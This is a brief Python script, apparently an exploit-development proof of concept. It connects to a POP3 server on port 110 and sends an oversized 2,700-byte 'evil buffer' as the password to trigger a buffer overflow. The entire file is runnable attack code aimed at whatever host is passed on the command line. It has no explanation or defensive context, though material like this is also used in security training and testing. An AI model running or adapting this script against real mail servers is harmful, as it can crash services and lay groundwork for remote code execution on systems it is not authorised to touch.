#!/usr/bin/python

import socket
import sys


def get_buffer():
	return "A" * 2700


def send_buffer():
	host = sys.argv[1]
	buffer = get_buffer()
	
	sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	print("Send evil buffer...")
	sck.connect((host, 110))
	sck.recv(1024)
	sck.send("USER username\r\n")
	sck.recv(1024)
	sck.send("PASS " + buffer + "\r\n")
	sck.recv(1024)
	print("Done!")


try:
	send_buffer()
except Exception as e:
	print("ERROR: " + str(e))